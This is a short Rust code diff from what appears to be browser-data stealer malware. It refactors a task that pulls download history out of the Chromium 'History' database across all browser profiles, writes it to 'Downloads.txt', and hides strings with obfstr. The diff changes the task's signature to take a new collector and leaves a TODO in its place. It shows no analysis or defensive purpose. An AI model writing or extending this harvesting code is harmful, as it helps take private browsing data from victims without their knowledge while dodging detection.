@@ -2,7 +2,7 @@ use crate::chromium::BrowserData;
 use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Download};
 use alloc::borrow::ToOwned;
 use alloc::sync::Arc;
-use alloc::vec::Vec;
+use collector::atomic::AtomicCollector;
 use database::TableRecord;
 use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
@@ -23,8 +23,9 @@ impl DownloadsTask {
 
 impl Task for DownloadsTask {
     parent_name!("Downloads.txt");
-    
-    unsafe fn run(&self, parent: &Path) {
+
+    // TODO: Impl collector
+    unsafe fn run(&self, parent: &Path, _: &AtomicCollector) {
         let Some(mut downloads) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
             |profile| profile / s!("History"),
